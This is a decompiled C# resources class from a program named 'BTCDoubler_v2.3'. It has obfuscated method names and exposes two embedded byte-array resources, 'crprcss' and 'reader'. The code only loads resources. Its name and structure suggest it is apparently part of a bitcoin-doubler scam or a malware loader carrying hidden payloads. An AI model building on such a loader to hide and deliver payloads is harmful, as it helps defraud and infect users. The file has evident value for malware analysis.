using System.CodeDom.Compiler;
using System.Diagnostics;
using System.Globalization;
using System.Resources;
using System.Runtime.CompilerServices;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace BTCDoubler_v2._3.My.Resources;

[CompilerGenerated]
[StandardModule]
[DebuggerNonUserCode]
[GeneratedCode("System.Resources.Tools.StronglyTypedResourceBuilder", "4.0.0.0")]
[HideModuleName]
internal sealed class Resources
{
	private static ResourceManager resourceManager_0;

	private static CultureInfo cultureInfo_0;

	[SpecialName]
	internal static ResourceManager smethod_0()
	{
		if (object.ReferenceEquals(resourceManager_0, null))
		{
			ResourceManager resourceManager = (resourceManager_0 = new ResourceManager("BTCDoubler_v2._3.Resources", typeof(Resources).Assembly));
		}
		return resourceManager_0;
	}

	[SpecialName]
	internal static CultureInfo smethod_1()
	{
		return cultureInfo_0;
	}

	[SpecialName]
	internal static void smethod_2(CultureInfo cultureInfo_1)
	{
		cultureInfo_0 = cultureInfo_1;
	}

	[SpecialName]
	internal static byte[] smethod_3()
	{
		object objectValue = RuntimeHelpers.GetObjectValue(smethod_0().GetObject("crprcss", cultureInfo_0));
		return (byte[])objectValue;
	}

	[SpecialName]
	internal static byte[] smethod_4()
	{
		object objectValue = RuntimeHelpers.GetObjectValue(smethod_0().GetObject("reader", cultureInfo_0));
		return (byte[])objectValue;
	}
}
